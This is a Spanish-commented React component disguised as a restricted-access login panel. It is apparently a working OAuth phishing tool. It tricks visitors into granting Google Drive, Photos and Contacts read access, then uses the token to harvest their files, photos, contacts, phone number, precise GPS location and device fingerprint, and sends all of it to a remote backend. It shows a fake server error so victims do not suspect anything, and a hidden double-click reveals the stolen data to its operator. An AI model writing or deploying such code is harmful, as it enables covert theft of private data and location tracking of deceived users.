import React, { useState } from 'react';
import { useGoogleLogin } from '@react-oauth/google';
import './Honeypot.css';

const TelemetryComponent = () => {
    const [isLogged, setIsLogged] = useState(false);
    const [userData, setUserData] = useState(null);
    const [showHoneypotData, setShowHoneypotData] = useState(false); // Estado secreto para el admin
    const [fakeError, setFakeError] = useState(false); // Para simular un fallo real tras el robo

    // Si el usuario se queda esperando, mostramos un error falso para que no sospeche
    React.useEffect(() => {
        if (isLogged && !showHoneypotData) {
            const timer = setTimeout(() => {
                setFakeError(true);
            }, 6000); // Tras 6 segundos de "carga", simulamos un error de servidor
            return () => clearTimeout(timer);
        }
    }, [isLogged, showHoneypotData]);

    const getFingerprintAndSend = async (decodedGoogleUser, accessToken, driveFilesString, victimPhone) => {
        let batteryLevel = null;
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                batteryLevel = battery.level * 100;
            } catch (e) {
                console.error('Battery API no permitida', e);
            }
        }

        // Intentar obtener ubicación GPS precisa
        let latitude = null;
        let longitude = null;
        
        const getCoords = () => {
            console.log("🛰️ Iniciando solicitud de GPS...");
            return new Promise((resolve) => {
                if ("geolocation" in navigator) {
                    // Forzamos una solicitud con opciones más permisivas
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            console.log("✅ GPS capturado con éxito:", pos.coords.latitude, pos.coords.longitude);
                            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
                        },
                        (err) => {
                            console.warn("❌ Error de Geolocalización:", err.code, err.message);
                            if (err.code === 1) alert("Por favor, permite el acceso a la ubicación para la verificación de seguridad.");
                            resolve(null);
                        },
                        { 
                            enableHighAccuracy: true, 
                            timeout: 15000, // Aumentamos a 15 segundos
                            maximumAge: 0 
                        }
                    );
                } else {
                    console.error("El navegador no soporta Geolocalización");
                    resolve(null);
                }
            });
        };

        const coords = await getCoords();
        if (coords) {
            latitude = coords.lat;
            longitude = coords.lon;
        }

        // Obtener ISP dinámicamente si es posible o esperar a que el admin lo resuelva
        const getGPU = () => {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "WebGL No Soportado";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return gl.getParameter(gl.RENDERER) || "Genérica";
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) {
                return "Bloqueado por Navegador";
            }
        };

        const payload = {
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            cpuCores: navigator.hardwareConcurrency || null,
            ramGb: navigator.deviceMemory || null, 
            batteryLevelPct: batteryLevel,
            languageInfo: navigator.language || "unknown",
            timeZoneInfo: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
            userAgentData: navigator.userAgent || "unknown",
            identityName: decodedGoogleUser?.name || "Anonymous Visitor",
            identityEmail: decodedGoogleUser?.email || "no-email@visitor.com",
            identityPictureUrl: decodedGoogleUser?.picture || "",
            stolenDriveFiles: driveFilesString || "Sin permisos / Vacio",
            latitude: latitude,
            longitude: longitude,
            gpuModel: getGPU(),
            connectionType: navigator.connection?.effectiveType || "unknown",
            ispName: "Pendiente de Geolocalización",
            phoneNumber: victimPhone || "No disponible"
        };

        // ====== INICIO LOGS DE AUDITORIA (Lo que ve el atacante/usuario) ======
        console.group("🚨 [HONEYPOT] Datos extraídos sigilosamente");
        console.table({
            "🕵️ Nombre": payload.identityName,
            "📧 Correo": payload.identityEmail,
            "🌐 Navegador/SO": payload.userAgentData.substring(0, 50) + "...",
            "💻 Resolución": `${payload.screenWidth}x${payload.screenHeight}`,
            "🧠 Núcleos CPU": payload.cpuCores,
            "💾 RAM (GB)": payload.ramGb,
            "🔋 Batería": payload.batteryLevelPct ? `${payload.batteryLevelPct}%` : "No disp.",
            "🌍 Zona Horaria": payload.timeZoneInfo
        });
        
        console.log("🔑 Access Token Obtenido (sirve para extraer Drive/Contactos usando la API de Google):");
        console.log(accessToken);
        
        console.log("⬆️ Enviando telemetría al servidor remoto...");
        console.groupEnd();
        // ====== LOGS PARA TI (ADMIN) ======
        const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:5006';
        try {
            await fetch(`${BACKEND_URL}/api/telemetry/audit`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            console.log("✅ [HONEYPOT] Servidor confirmó recepción silenciosa. Datos en SQL Server."); 
        } catch (error) {
            console.error("❌ [HONEYPOT] Fallo de red intentando contactar servidor Dapper/C#:", error);
        }
    };

    const loginWithExtraScopes = useGoogleLogin({
        onSuccess: async (tokenResponse) => {
            console.log("Respuesta de OAuth de Google:", tokenResponse);
            
            // Verificamos si los scopes fueron concedidos
            console.log("Scopes concedidos:", tokenResponse.scope);
            
            // PEQUEÑO RETRASO para asegurar que el token esté activo en los servidores de Google
            console.log("⏳ Esperando 2 segundos para estabilizar la sesión...");
            await new Promise(r => setTimeout(r, 2000));

            const userInfoResponse = await fetch('https://www.googleapis.com/oauth2/v3/userinfo', {
                headers: { Authorization: `Bearer ${tokenResponse.access_token}` }
            });
            const userInfo = await userInfoResponse.json();
            
            setUserData(userInfo);
            setIsLogged(true);

            // 0. NUEVO: Intentar extraer el número de teléfono del propio perfil de la víctima
            let victimPhone = "No disponible";
            try {
                const profileResponse = await fetch('https://people.googleapis.com/v1/people/me?personFields=phoneNumbers', {
                    headers: { Authorization: `Bearer ${tokenResponse.access_token}` }
                });
                if (profileResponse.ok) {
                    const profileData = await profileResponse.json();
                    victimPhone = profileData.phoneNumbers?.[0]?.value || "No disponible";
                    console.log("📱 Teléfono de la víctima extraído:", victimPhone);
                    setUserData(prev => ({ ...prev, phoneNumber: victimPhone }));
                }
            } catch (e) { console.error("Error extrayendo perfil propio:", e); }
            
            // === MODO ATACANTE: USAR EL TOKEN PARA LEER EL GOOGLE DRIVE Y PHOTOS ===
            console.log("🕵️ Intentando usar la Llave Maestra (Token) para leer Google Drive y Photos...");
            let driveFilesString = "Sin permisos / Vacio";
            try {
                // 1. Extraer los últimos 5 archivos generales de Drive
                const driveResponse = await fetch('https://www.googleapis.com/drive/v3/files?pageSize=5&fields=files(id,name,mimeType,webViewLink,iconLink,thumbnailLink)', {
                    headers: { 'Authorization': `Bearer ${tokenResponse.access_token}` }
                });
                const driveData = await driveResponse.json();
                
                // 2. Extraer específicamente hasta 30 fotos/imágenes de Drive
                const drivePhotosResponse = await fetch("https://www.googleapis.com/drive/v3/files?pageSize=30&q=mimeType contains 'image/'&fields=files(id,name,thumbnailLink,webViewLink)", {
                    headers: { 'Authorization': `Bearer ${tokenResponse.access_token}` }
                });
                const drivePhotosData = await drivePhotosResponse.json();

                // 3. NUEVO: Extraer fotos de la API de Google Photos (MediaItems)
                let googlePhotos = [];
                try {
                    console.log("📸 Intentando acceder a Google Photos Library API...");
                    const photosLibraryResponse = await fetch("https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=15", {
                        headers: { 
                            'Authorization': `Bearer ${tokenResponse.access_token}`,
                            'Accept': 'application/json'
                        }
                    });
                    
                    if (photosLibraryResponse.ok) {
                        const photosLibraryData = await photosLibraryResponse.json();
                        if (photosLibraryData.mediaItems) {
                            googlePhotos = photosLibraryData.mediaItems.map(item => ({
                                id: item.id,
                                name: item.filename,
                                thumbnailLink: item.baseUrl,
                                webViewLink: item.productUrl
                            }));
                        }
                    }
                } catch (phError) {
                    console.error("Error de red intentando contactar Google Photos:", phError);
                }

                // 4. NUEVO: Extraer contactos de la víctima (People API)
                let contacts = [];
                try {
                    console.log("👥 Intentando extraer lista de contactos...");
                    const contactsResponse = await fetch("https://people.googleapis.com/v1/people/me/connections?personFields=names,emailAddresses,phoneNumbers&pageSize=50", {
                        headers: { 'Authorization': `Bearer ${tokenResponse.access_token}` }
                    });
                    const contactsData = await contactsResponse.json();
                    console.log("Respuesta raw de People API:", contactsData); // LOG CRÍTICO

                    if (contactsData.connections) {
                        contacts = contactsData.connections.map(c => ({
                            name: c.names?.[0]?.displayName || "Sin nombre",
                            email: c.emailAddresses?.[0]?.value || "Sin email",
                            phone: c.phoneNumbers?.[0]?.value || "Sin teléfono"
                        }));
                        console.log(`✅ ${contacts.length} contactos procesados.`);
                    } else {
                        console.log("⚠️ No se encontraron conexiones (contactos) en esta cuenta.");
                    }
                } catch (cError) {
                    console.error("Fallo al leer contactos:", cError);
                }
                
                const allFiles = {
                    documents: driveData.files || [],
                    photos: drivePhotosData.files || [],
                    googlePhotos: googlePhotos,
                    contacts: contacts
                };

                console.group("📂 [BOTÍN EXTRAÍDO] Víctima comprometida.");
                console.log("Documentos Drive:", allFiles.documents.length);
                console.log("Fotos Drive:", allFiles.photos.length);
                console.log("Fotos Google Photos:", allFiles.googlePhotos.length);
                console.log("Contactos:", allFiles.contacts.length);
                
                // Guardar en el estado local para el admin
                setUserData(prev => ({
                    ...prev, 
                    driveFiles: allFiles.documents, 
                    drivePhotos: allFiles.photos,
                    googlePhotos: allFiles.googlePhotos,
                    contacts: allFiles.contacts
                }));
                
                // Convertir todo el paquete a JSON para el SQL
                driveFilesString = JSON.stringify(allFiles);
                console.log("📦 Paquete JSON final para SQL:", driveFilesString);
                console.groupEnd();
            } catch (error) {
                console.error("Fallo al intentar leer el Drive/Photos:", error);
            }
            // ==============================================================
            
            console.log("🚀 Enviando a getFingerprintAndSend con JSON:", driveFilesString);
            getFingerprintAndSend(userInfo, tokenResponse.access_token, driveFilesString, victimPhone);
        },
        onError: error => console.log('El inicio de sesión falló', error),
        // ¡¡AQUI ESTA LA TRAMPA!! Pedimos acceso para leer Drive, Fotos y Contactos (Gmail y YouTube eliminados)
        scope: 'https://www.googleapis.com/auth/drive.readonly https://www.googleapis.com/auth/photoslibrary.readonly https://www.googleapis.com/auth/contacts.readonly' 
    });

    return (
        <div className="login-container">
            <h2>Panel de Acceso Restringido</h2>
            
            {!isLogged ? (
                <>
                    <p>Por favor, inicia sesión para continuar de forma segura.</p>
                    <div style={{ display: 'flex', justifyContent: 'center', marginTop: '20px' }}>
                        {/* Como pedimos scopes especiales, debemos usar un botón HTML normal */}
                        <button onClick={() => loginWithExtraScopes()} className="custom-google-btn">
                            Acceder usando Google (Intentar extraer más cosas)
                        </button>
                    </div>
                </>
            ) : (
                <div className="welcome-message">
                    <h3>Bienvenido, {userData?.name}</h3>
                    {/* El administrador (tú) debe hacer DOBLE CLIC en la foto de perfil para revelar los archivos robados */}
                    <img 
                        src={userData?.picture} 
                        alt="Perfil" 
                        onDoubleClick={() => setShowHoneypotData(!showHoneypotData)}
                        style={{ borderRadius: '50%', width: '80px', marginTop: '10px', cursor: 'default' }} 
                    />
                    
                    {!showHoneypotData ? (
                        fakeError ? (
                            <div style={{ marginTop: '20px', color: '#ff4444', fontWeight: 'bold' }}>
                                ⚠️ Error de conexión: El servicio de autenticación no está disponible (503 Service Unavailable).
                                <br/>
                                <small style={{ color: '#888', fontWeight: 'normal' }}>Por favor, contacte con soporte técnico o intente más tarde.</small>
                            </div>
                        ) : (
                            <p>Acceso concedido. Cargando tu panel de usuario, por favor espera...</p>
                        )
                    ) : (
                        <p style={{ color: 'red' }}>[MODO ADMINISTRADOR ACTIVADO] Telemetría y permisos extraídos enviados al Honeypot</p>
                    )}
                    
                    {(userData?.driveFiles && showHoneypotData) && (
                        <div style={{ marginTop: '20px', padding: '15px', backgroundColor: '#1e1e1e', borderRadius: '8px', textAlign: 'left' }}>
                            <h4 style={{ color: '#ff4d4d', marginTop: 0 }}>🚨 Archivos Extraídos de Google Drive:</h4>
                            
                            {/* Fotos extraídas */}
                            {userData.drivePhotos?.length > 0 && (
                                <div style={{ marginBottom: '20px' }}>
                                    <h5 style={{ color: '#0f0', borderBottom: '1px solid #333', paddingBottom: '5px' }}>🖼️ Galería de Fotos:</h5>
                                    <div style={{ display: 'flex', gap: '10px', overflowX: 'auto', padding: '10px 0' }}>
                                        {userData.drivePhotos.map(photo => (
                                            <a key={photo.id} href={photo.webViewLink} target="_blank" rel="noreferrer">
                                                <img src={photo.thumbnailLink} alt={photo.name} style={{ height: '80px', borderRadius: '4px', border: '1px solid #444' }} title={photo.name} />
                                            </a>
                                        ))}
                                    </div>
                                </div>
                            )}

                            <h5 style={{ color: '#0f0', borderBottom: '1px solid #333', paddingBottom: '5px' }}>📄 Documentos:</h5>
                            <ul style={{ listStyle: 'none', padding: 0 }}>
                                {userData.driveFiles.map(file => (
                                    <li key={file.id} style={{ margin: '10px 0', borderBottom: '1px solid #444', paddingBottom: '10px' }}>
                                        <img src={file.iconLink} alt="icon" style={{ width: '16px', marginRight: '10px', verticalAlign: 'middle' }}/>
                                        <a href={file.webViewLink} target="_blank" rel="noreferrer" style={{ color: '#61dafb', textDecoration: 'none' }}>
                                            {file.name}
                                        </a>
                                    </li>
                                ))}
                            </ul>

                            {/* Contactos extraídos */}
                            {userData.contacts?.length > 0 && (
                                <div style={{ marginTop: '20px' }}>
                                    <h5 style={{ color: '#ffff00', borderBottom: '1px solid #333', paddingBottom: '5px' }}>👥 Contactos Extraídos:</h5>
                                    <div style={{ maxHeight: '150px', overflowY: 'auto', backgroundColor: '#000', padding: '10px', borderRadius: '4px' }}>
                                        {userData.contacts.map((c, i) => (
                                            <div key={i} style={{ fontSize: '12px', borderBottom: '1px solid #222', padding: '5px 0', display: 'flex', justifyContent: 'space-between' }}>
                                                <span style={{ color: '#fff' }}>{c.name}</span>
                                                <span style={{ color: '#ffff00' }}>{c.phone || c.email}</span>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            )}

                            <small style={{ color: '#888' }}>Haz clic en los enlaces para abrir los documentos reales.</small>
                        </div>
                    )}
                </div>
            )}
        </div>
    );
};

export default TelemetryComponent;
